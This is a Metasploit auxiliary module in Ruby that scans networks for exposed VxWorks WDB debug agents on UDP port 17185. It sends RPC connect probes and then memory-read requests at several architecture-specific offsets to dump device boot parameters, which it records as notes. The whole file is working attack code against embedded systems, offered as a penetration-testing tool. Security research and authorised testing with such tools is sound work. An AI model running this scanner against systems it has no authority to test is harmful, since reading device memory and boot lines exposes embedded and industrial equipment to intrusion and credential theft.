##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::WDBRPC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'VxWorks WDB Agent Boot Parameter Scanner',
      'Description' => 'Scan for exposed VxWorks wdbrpc daemons and dump the boot parameters from memory',
      'Author'      => 'hdm',
      'License'     => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html'],
          ['US-CERT-VU', '362332']
        ]
    )

    register_options(
    [
      OptInt.new('BATCHSIZE', [true, 'The number of hosts to probe in each set', 256]),
      Opt::RPORT(17185)
    ])
  end


  # Define our batch size
  def run_batch_size
    datastore['BATCHSIZE'].to_i
  end

  # Operate on an entire batch of hosts at once
  def run_batch(batch)

    begin
      udp_sock = nil
      idx = 0

      udp_sock = Rex::Socket::Udp.create(
        {
          'Context' => {'Msf' => framework, 'MsfExploit' => self}
        }
      )
      add_socket(udp_sock)

      @udp_sock = udp_sock

      batch.each do |ip|

        begin
          udp_sock.sendto(create_probe(ip), ip, datastore['RPORT'].to_i, 0)
        rescue ::Interrupt
          raise $!
        rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
          nil
        end

        if (idx % 10 == 0)
          while (r = udp_sock.recvfrom(65535, 0.01) and r[1])
            parse_reply(r)
          end
        end

        idx += 1
      end

      cnt = 0
      del = 10
      sts = Time.now.to_i
      while (r = udp_sock.recvfrom(65535, del) and r[1])
        parse_reply(r)

        # Prevent an indefinite loop if the targets keep replying
        cnt += 1
        break if cnt > run_batch_size

        # Escape after 15 seconds regardless of batch size
        break if ((sts + 15) < Time.now.to_i)

        del = 1.0
      end

    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_status("Unknown error: #{e.class} #{e}")
    ensure
      udp_sock.close if udp_sock
    end
  end

  #
  # The response parsers
  #
  def parse_reply(pkt)

    return if not pkt[1]

    if(pkt[1] =~ /^::ffff:/)
      pkt[1] = pkt[1].sub(/^::ffff:/, '')
    end

    data = pkt[0]

    # Bare RPC response
    if data.length == 24
      ecode = data[20,4].unpack("N")[0]
      emesg = "unknown"
      case ecode
      when 3
        # Should not be hit
        emesg = "Device requires the VxWorks 5 WDB protocol"
      when 5
        emesg = "Device failed to parse the probe"
      end

      print_status("#{pkt[1]} Error: code=#{ecode} #{emesg}")
      return
    end

    if data.length < 80
      print_status("#{pkt[1]}: Unknown response #{data.unpack("H*")[0]}")
      return
    end

    # Memory dump response
    if data[48,64] =~ /^.{1,16}\(\d+,\d+\)/
      buff = data[48, data.length-48]
      boot,left = buff.split("\x00", 2)
      print_good("#{pkt[1]}: BOOT> #{boot}")
      report_note(
        :host   => pkt[1],
        :port   => datastore['RPORT'],
        :proto  => 'udp',
        :type   => 'vxworks.bootline',
        :data   => {:bootline => boot },
        :update => :unique_data
      )
      return
    end

    res = wdbrpc_parse_connect_reply(data)

    if res[:rt_membase]
      print_good("#{pkt[1]}: #{res[:rt_vers]} #{res[:rt_bsp_name]} #{res[:rt_bootline]}")

      report_note(
        :host   => pkt[1],
        :port   => datastore['RPORT'],
        :proto  => 'udp',
        :type   => 'vxworks.target_info',
        :data   => res,
        :update => :unique
      )

      # Send the memory dump request for the bootline. Theoretically we can infer the correct
      # location from the cpu type and BSP name, but these are tough to categorize and there
      # is no harm in trying multiple offsets

      # Most common mapping is 0x700 (M68k, ARM, etc)
      @udp_sock.sendto(wdbrpc_request_memread(res[:rt_membase] + 0x700, 512), pkt[1], datastore['RPORT'].to_i, 0)

      # PowerPC uses 0x4200
      @udp_sock.sendto(wdbrpc_request_memread(res[:rt_membase] + 0x4200, 512), pkt[1], datastore['RPORT'].to_i, 0)

      # PC x86 uses 0x1200
      @udp_sock.sendto(wdbrpc_request_memread(res[:rt_membase] + 0x1200, 512), pkt[1], datastore['RPORT'].to_i, 0)

      # SPARC-lite uses 0x600
      @udp_sock.sendto(wdbrpc_request_memread(res[:rt_membase] + 0x600, 512), pkt[1], datastore['RPORT'].to_i, 0)
    end
  end


  def create_probe(ip)
    wdbrpc_request_connect(ip)
  end
end
